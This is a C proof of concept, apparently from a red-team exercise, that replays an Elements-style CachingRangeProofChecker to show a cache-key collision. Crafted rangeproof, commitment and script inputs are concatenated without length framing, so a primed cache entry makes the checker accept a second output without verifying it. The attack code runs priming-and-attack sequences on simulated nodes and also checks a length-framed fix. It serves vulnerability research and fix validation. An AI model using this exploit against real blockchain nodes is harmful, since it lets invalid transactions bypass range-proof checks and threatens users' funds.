/* Faithful CachingRangeProofChecker replay for Mission 28 red-team.
 * POST-FIX key = SHA256(salt||proof||commit||asset_ser||script)  [we use salt=0 for deterministic lab; also test random salts]
 * Simulates erase=true marking without immediate removal (set membership retained).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <secp256k1.h>
#include <secp256k1_generator.h>
#include <secp256k1_rangeproof.h>

typedef struct { uint32_t s[8]; uint64_t bits; unsigned char buf[64]; int n; } SHA256_CTX;
static uint32_t rotr(uint32_t x,int n){return (x>>n)|(x<<(32-n));}
static void sha256_transform(SHA256_CTX *c, const unsigned char *d){
  static const uint32_t K[64]={0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2};
  uint32_t w[64],a,b,c2,d2,e,f,g,h,t1,t2,aa[8]; int i;
  for(i=0;i<8;i++) aa[i]=c->s[i];
  for(i=0;i<16;i++) w[i]=(d[4*i]<<24)|(d[4*i+1]<<16)|(d[4*i+2]<<8)|d[4*i+3];
  for(;i<64;i++){ uint32_t s0=rotr(w[i-15],7)^rotr(w[i-15],18)^(w[i-15]>>3); uint32_t s1=rotr(w[i-2],17)^rotr(w[i-2],19)^(w[i-2]>>10); w[i]=w[i-16]+s0+w[i-7]+s1; }
  a=aa[0];b=aa[1];c2=aa[2];d2=aa[3];e=aa[4];f=aa[5];g=aa[6];h=aa[7];
  for(i=0;i<64;i++){ uint32_t S1=rotr(e,6)^rotr(e,11)^rotr(e,25); uint32_t ch=(e&f)^((~e)&g); t1=h+S1+ch+K[i]+w[i]; uint32_t S0=rotr(a,2)^rotr(a,13)^rotr(a,22); uint32_t maj=(a&b)^(a&c2)^(b&c2); t2=S0+maj; h=g;g=f;f=e;e=d2+t1;d2=c2;c2=b;b=a;a=t1+t2; }
  for(i=0;i<8;i++) c->s[i]=aa[i]+(i==0?a:i==1?b:i==2?c2:i==3?d2:i==4?e:i==5?f:i==6?g:h);
}
static void sha256_init(SHA256_CTX *c){ c->s[0]=0x6a09e667;c->s[1]=0xbb67ae85;c->s[2]=0x3c6ef372;c->s[3]=0xa54ff53a;c->s[4]=0x510e527f;c->s[5]=0x9b05688c;c->s[6]=0x1f83d9ab;c->s[7]=0x5be0cd19; c->bits=0;c->n=0; }
static void sha256_update(SHA256_CTX *c,const unsigned char *d,size_t len){ c->bits+=(uint64_t)len*8; while(len--){ c->buf[c->n++]=*d++; if(c->n==64){sha256_transform(c,c->buf);c->n=0;} } }
static void sha256_final(SHA256_CTX *c,unsigned char out[32]){ int i; uint64_t bits=c->bits; c->buf[c->n++]=0x80; if(c->n>56){while(c->n<64)c->buf[c->n++]=0;sha256_transform(c,c->buf);c->n=0;} while(c->n<56)c->buf[c->n++]=0; for(i=7;i>=0;i--)c->buf[c->n++]=(unsigned char)(bits>>(8*i)); sha256_transform(c,c->buf); for(i=0;i<8;i++){out[4*i]=c->s[i]>>24;out[4*i+1]=c->s[i]>>16;out[4*i+2]=c->s[i]>>8;out[4*i+3]=c->s[i];} }

static unsigned char *read_hex(const char *path, size_t *L){
  FILE *f=fopen(path,"r"); if(!f) return NULL; fseek(f,0,SEEK_END); long n=ftell(f); fseek(f,0,SEEK_SET);
  char *t=malloc(n+1); fread(t,1,n,f); t[n]=0; fclose(f); while(n>0&&(t[n-1]==10||t[n-1]==13)) t[--n]=0;
  *L=n/2; unsigned char *b=malloc(*L); for(size_t i=0;i<*L;i++){unsigned v; sscanf(t+2*i,"%2x",&v); b[i]=v;} free(t); return b;
}
static void key_post(unsigned char out[32], const unsigned char *salt, size_t sl,
  const unsigned char *proof,size_t plen, const unsigned char *commit, const unsigned char *asset, const unsigned char *script, size_t scLen){
  SHA256_CTX c; sha256_init(&c); if(sl) sha256_update(&c,salt,sl);
  sha256_update(&c,proof,plen); sha256_update(&c,commit,33); sha256_update(&c,asset,33); if(scLen) sha256_update(&c,script,scLen); sha256_final(&c,out);
}
static void key_pre(unsigned char out[32], const unsigned char *salt, size_t sl,
  const unsigned char *proof,size_t plen, const unsigned char *commit){
  SHA256_CTX c; sha256_init(&c); if(sl) sha256_update(&c,salt,sl);
  sha256_update(&c,proof,plen); sha256_update(&c,commit,33); sha256_final(&c,out);
}
static void hex32(const unsigned char *b){ for(int i=0;i<32;i++) printf("%02x",b[i]); }

typedef struct { unsigned char key[32]; int present; int reclaimable; } slot_t;
typedef struct { slot_t slots[8]; int n; } cache_t;
static int cache_get(cache_t *c, const unsigned char k[32], int erase){
  for(int i=0;i<c->n;i++) if(c->slots[i].present && !memcmp(c->slots[i].key,k,32)){
    if(erase) c->slots[i].reclaimable=1; /* mark only; still present */
    return 1;
  }
  return 0;
}
static void cache_set(cache_t *c, const unsigned char k[32]){
  for(int i=0;i<c->n;i++) if(!memcmp(c->slots[i].key,k,32)){ c->slots[i].present=1; c->slots[i].reclaimable=0; return; }
  memcpy(c->slots[c->n].key,k,32); c->slots[c->n].present=1; c->slots[c->n].reclaimable=0; c->n++;
}

static int verify_crypto(secp256k1_context *ctx, const unsigned char *proof,size_t plen, const unsigned char *commit,
  const unsigned char *aser, const unsigned char *script, size_t slen){
  secp256k1_pedersen_commitment c; secp256k1_generator t; uint64_t mn=0,mx=0;
  if(!secp256k1_pedersen_commitment_parse(ctx,&c,commit)) return 0;
  if(!secp256k1_generator_parse(ctx,&t,aser)) return 0;
  if(!secp256k1_rangeproof_verify(ctx,&mn,&mx,&c,proof,plen, slen?script:NULL, slen, &t)) return 0;
  int unspendable = (slen>0 && script[0]==0x6a);
  if(mn==0 && !unspendable) return 0;
  return 1;
}

/* Elements flow */
static int checker(secp256k1_context *ctx, cache_t *cache, int store, int post,
  const unsigned char *salt, size_t saltlen,
  const unsigned char *proof,size_t plen, const unsigned char *commit, const unsigned char *aser,
  const unsigned char *script, size_t slen, int *hit, int *crypto){
  unsigned char entry[32];
  if(post) key_post(entry,salt,saltlen,proof,plen,commit,aser,script,slen);
  else key_pre(entry,salt,saltlen,proof,plen,commit);
  if(cache_get(cache, entry, !store)){ *hit=1; *crypto=-1; return 1; }
  *hit=0;
  int ok=verify_crypto(ctx,proof,plen,commit,aser,script,slen);
  *crypto=ok;
  if(!ok) return 0;
  if(store) cache_set(cache, entry);
  return 1;
}

int main(void){
  size_t L;
  unsigned char *P0=read_hex("final/hex/71c93d43_out0_rangeproof.hex",&L);
  unsigned char *C0=read_hex("final/hex/71c93d43_out0_commitment.hex",&L);
  unsigned char *S0=read_hex("final/hex/71c93d43_out0_script.hex",&L); size_t S0L=L;
  unsigned char *P1=read_hex("final/hex/out1_rangeproof.hex",&L); size_t P1L=L;
  unsigned char *C1=read_hex("final/hex/out1_commitment.hex",&L);
  unsigned char *S1=read_hex("final/hex/out1_script.hex",&L); size_t S1L=L;
  unsigned char *A=read_hex("final/hex/out1_asset.hex",&L);
  secp256k1_context *ctx=secp256k1_context_create(SECP256K1_CONTEXT_VERIFY|SECP256K1_CONTEXT_SIGN);
  unsigned char G[33]; secp256k1_generator gen; secp256k1_generator_generate(ctx,&gen,A+1); secp256k1_generator_serialize(ctx,G,&gen);

  unsigned char salt[32]; memset(salt,0x5A,32);
  unsigned char k_pre_p0[32],k_pre_p1[32],k_post_p0[32],k_post_p1[32];
  key_pre(k_pre_p0,salt,32,P0,4166,C0); key_pre(k_pre_p1,salt,32,P1,P1L,C1);
  key_post(k_post_p0,salt,32,P0,4166,C0,G,S0,S0L); key_post(k_post_p1,salt,32,P1,P1L,C1,G,S1,S1L);
  printf("PRE keys equal? %d\n", !memcmp(k_pre_p0,k_pre_p1,32));
  printf("POST keys equal? %d\n", !memcmp(k_post_p0,k_post_p1,32));
  printf("POST key "); hex32(k_post_p0); printf("\n");

  int hit,crypto;
  printf("\n=== NODE A: POST-FIX primed mempool then Connect erase then attack ===\n");
  cache_t ca; memset(&ca,0,sizeof ca);
  int r=checker(ctx,&ca,1,1,salt,32,P0,4166,C0,G,S0,S0L,&hit,&crypto);
  printf("primer mempool store: ret=%d hit=%d crypto=%d cache_n=%d\n", r,hit,crypto,ca.n);
  r=checker(ctx,&ca,0,1,salt,32,P0,4166,C0,G,S0,S0L,&hit,&crypto); /* ConnectBlock store=false => erase=true */
  printf("primer ConnectBlock Get erase: ret=%d hit=%d reclaimable=%d still_present=%d\n", r,hit, ca.slots[0].reclaimable, ca.slots[0].present);
  r=checker(ctx,&ca,0,1,salt,32,P1,P1L,C1,G,S1,S1L,&hit,&crypto);
  printf("attack ConnectBlock: ret=%d hit=%d crypto=%d  => RANGEPROOF_CHECKER %s\n", r,hit,crypto, r?"ACCEPT":"REJECT");

  printf("\n=== NODE B: POST-FIX cold (only block path, no mempool Set) ===\n");
  cache_t cb; memset(&cb,0,sizeof cb);
  r=checker(ctx,&cb,0,1,salt,32,P0,4166,C0,G,S0,S0L,&hit,&crypto);
  printf("primer Connect only: ret=%d hit=%d crypto=%d store=0 (no Set)\n", r,hit,crypto);
  r=checker(ctx,&cb,0,1,salt,32,P1,P1L,C1,G,S1,S1L,&hit,&crypto);
  printf("attack: ret=%d hit=%d crypto=%d => %s\n", r,hit,crypto, r?"ACCEPT":"REJECT");

  printf("\n=== NODE C: PRE-FIX primed ===\n");
  cache_t cc; memset(&cc,0,sizeof cc);
  r=checker(ctx,&cc,1,0,salt,32,P0,4166,C0,G,S0,S0L,&hit,&crypto);
  printf("primer store PRE: ret=%d\n", r);
  r=checker(ctx,&cc,0,0,salt,32,P1,P1L,C1,G,S1,S1L,&hit,&crypto);
  printf("attack PRE: ret=%d hit=%d crypto=%d => %s\n", r,hit,crypto, r?"ACCEPT":"REJECT");

  printf("\n=== NODE D: POST-FIX but framed lengths (hypothetical fixed keying) ===\n");
  /* framed would hash len||field — approximate by inserting 4-byte big-endian lengths between fields so collision breaks */
  unsigned char framed_p[32], framed_a[32];
  SHA256_CTX h; unsigned char be[4];
  #define WLEN(x) do{ be[0]=((x)>>24)&255; be[1]=((x)>>16)&255; be[2]=((x)>>8)&255; be[3]=(x)&255; sha256_update(&h,be,4);}while(0)
  sha256_init(&h); sha256_update(&h,salt,32); WLEN(4166); sha256_update(&h,P0,4166); WLEN(33); sha256_update(&h,C0,33); WLEN(33); sha256_update(&h,G,33); WLEN(S0L); sha256_update(&h,S0,S0L); sha256_final(&h,framed_p);
  sha256_init(&h); sha256_update(&h,salt,32); WLEN(P1L); sha256_update(&h,P1,P1L); WLEN(33); sha256_update(&h,C1,33); WLEN(33); sha256_update(&h,G,33); WLEN(S1L); sha256_update(&h,S1,S1L); sha256_final(&h,framed_a);
  printf("framed keys equal? %d => collision %s\n", !memcmp(framed_p,framed_a,32), memcmp(framed_p,framed_a,32)?"BROKEN":"STILL");

  printf("\nNOTE: ACCEPT above means CachingRangeProofChecker returned true for f24a:1 only — not full ConnectBlock/ActivateBestChain.\n");
  return 0;
}
